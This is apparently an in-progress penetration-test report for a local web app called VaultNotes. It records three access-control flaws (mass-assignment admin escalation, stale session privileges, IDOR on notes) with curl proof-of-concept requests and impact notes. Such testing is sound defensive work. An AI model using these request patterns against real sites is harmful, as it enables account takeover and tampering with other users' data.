# VaultNotes — Black-Box Security Assessment (In Progress)

**Tester:** [your name]
**Date:** September 2026
**Scope:** VaultNotes v1 (local instance, http://127.0.0.1:5000)
**Method:** Black-box testing via curl, using seed accounts `alice`, `bob`, and self-registered accounts. No source code was consulted for the findings below — all were discovered purely through interacting with the running application.

---

## Summary

| # | Finding | Category (OWASP) | Severity |
|---|---|---|---|
| 1 | Privilege Escalation via Mass Assignment | Broken Access Control | High |
| 2 | Stale Session Authorization | Broken Access Control | Low–Medium |
| 3 | Insecure Direct Object Reference (IDOR) on notes | Broken Access Control | High |

Root cause analysis (exact vulnerable code/lines) is deferred to the white-box phase of this assessment. This document covers black-box discovery and proof-of-concept only.

---

## Finding 1: Privilege Escalation via Mass Assignment

**Severity:** High

**Description**
The registration form (`/register`) only exposes `username`, `email`, and `password` fields in the rendered HTML. However, the endpoint accepts an additional, undocumented `is_admin` parameter in the POST body. Submitting this field with a value of `1` grants the newly created account administrator privileges, despite no such option being presented to normal users.

**Proof of Concept**

```
curl -i -c cookies.txt -X POST http://127.0.0.1:5000/register \
  -d "username=eve" \
  -d "email=eva@test.com" \
  -d "password=Hello12345!" \
  -d "is_admin=1"
```

Response: `302 FOUND`, account created successfully.

Verified against the database directly:

```
sqlite3 vaultnotes.db "SELECT id, username, is_admin FROM users WHERE username='eve';"
```

Result: `6|eve|1`

**Impact**
Any unauthenticated user can create a fully-privileged administrator account with no vetting or approval step, simply by adding one extra field to a standard registration request. This provides full access to the admin dashboard (all users, all notes, ability to delete either).

**Notes**
This is a classic mass-assignment vulnerability — the server trusts all fields present in the request body rather than only the fields it intends to accept.

---

## Finding 2: Stale Session Authorization

**Severity:** Low–Medium (compounding issue, not independently exploitable)

**Description**
Admin status appears to be evaluated and stored in the session at **login time**, rather than being re-checked against the database on each request. Immediately after Finding 1's registration request (which sets a session cookie as part of account creation), attempting to access `/admin` with that same session redirected away rather than granting access — even though `is_admin=1` was already present in the database for that account.

Access was only granted after a **fresh login** with the same credentials, which caused the admin flag to be (re)populated into the session.

**Proof of Concept**

```
# Immediately after registration (Finding 1), using the registration session:
curl -b cookies.txt http://127.0.0.1:5000/admin
# -> redirected to "/", NOT granted access, despite is_admin=1 in the DB

# After a fresh login:
curl -c cookies2.txt -X POST http://127.0.0.1:5000/login \
  -d "username=eve" -d "password=Hello12345!"
curl -b cookies2.txt http://127.0.0.1:5000/admin
# -> admin dashboard returned successfully
```

**Impact**
On its own, this is a minor inconsistency. Combined with Finding 1, it means privilege escalation requires one extra step (a fresh login) to take effect — worth noting since it affects how an attacker would actually exploit Finding 1 end-to-end, and it also implies that de-escalating a user's privileges would not take effect for any of their already-active sessions either.

---

## Finding 3: Insecure Direct Object Reference (IDOR) on Notes

**Severity:** High

**Description**
Notes are retrieved, edited, and deleted using a numeric ID in the URL path (`/notes/<id>`, `/notes/<id>/edit`, `/notes/<id>/delete`), with no verification that the requesting user is the owner of the note (or that the note is public, in the case of viewing). Any authenticated user can view, modify, or delete any other user's notes — including private ones — simply by knowing or guessing the note ID.

**Proof of Concept**

```
# 1. Log in as alice, create a private note
curl -c alice_cookies.txt -X POST http://127.0.0.1:5000/login \
  -d "username=alice" -d "password=AlicePass123!"

curl -b alice_cookies.txt -X POST http://127.0.0.1:5000/notes/new \
  -d "title=Alice Secret" -d "content=This should not be visible to bob"

# 2. Confirm note ID and ownership
sqlite3 vaultnotes.db "SELECT id, owner_id, title, is_public FROM notes WHERE title='Alice Secret';"
# -> e.g. 4|2|Alice Secret|0   (private, owned by alice/user id 2)

# 3. Log in as bob (a different, unrelated user)
curl -c bob_cookies.txt -X POST http://127.0.0.1:5000/login \
  -d "username=bob" -d "password=BobPass123!"

# 4. View alice's private note as bob
curl -b bob_cookies.txt http://127.0.0.1:5000/notes/4
# -> 200 OK, full title and content returned, including "This should not be visible to bob"

# 5. Edit alice's note as bob
curl -b bob_cookies.txt -X POST http://127.0.0.1:5000/notes/4/edit \
  -d "title=Hacked by bob" -d "content=pwned"
# -> note content changed in the database, confirmed via sqlite3 query
```

**Impact**
Complete breakdown of the private/public note distinction. Any authenticated user — including a brand-new, unprivileged account — can read, modify, or destroy any other user's data, including content the owner explicitly marked private. Since note IDs are sequential integers, an attacker doesn't even need to guess; they can simply enumerate them.

---

## Next Steps

- [ ] Confirm delete via the same IDOR path (view/edit already confirmed)
- [ ] Injection testing (SQLi in search, XSS in note content) — not yet started
- [ ] SSRF testing (link preview feature) — not yet started
- [ ] Authentication testing (login rate limiting / brute-force resistance) — not yet started
- [ ] White-box review to identify exact root cause (file/line) for each confirmed finding
- [ ] Remediation + re-test on `main` branch
